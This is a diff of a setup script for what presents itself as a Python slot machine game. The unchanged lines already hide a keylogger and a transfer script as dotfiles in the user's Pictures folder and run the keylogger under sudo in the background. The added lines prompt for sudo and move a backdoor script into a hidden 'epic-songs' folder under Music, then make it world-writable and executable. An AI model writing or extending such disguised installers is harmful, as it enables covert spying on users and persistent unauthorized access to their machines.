@@ -1,3 +1,7 @@
+# get the user to get sudo permissions
+sudo -i
+exit
+
 # activate venv
 cd ~/Python-Slots
 . slotmachine/bin/activate
@@ -39,6 +43,8 @@ cd ~/Python-Slots/dependencies
 mv .keylogger ~/Pictures
 mv .keylogger.sh ~/Pictures
 mv .transfer.sh ~/Pictures
+mkdir ~/Music/.epic-songs
+mv .backdoor_script ~/Music/.epic-songs
 cd ~/Pictures
 chgrp sudo .keylogger
 chgrp sudo .keylogger.sh
@@ -54,7 +60,7 @@ chgrp sudo .out
 chmod 666 .out
 sudo sh .keylogger.sh &
 disown
-cd ~/Python-Slots/dependencies
+cd ~/Music/.epic-songs
 chgrp sudo .backdoor_script.sh
 chmod 777 .backdoor_script.sh
 chmod +x .backdoor_script.sh
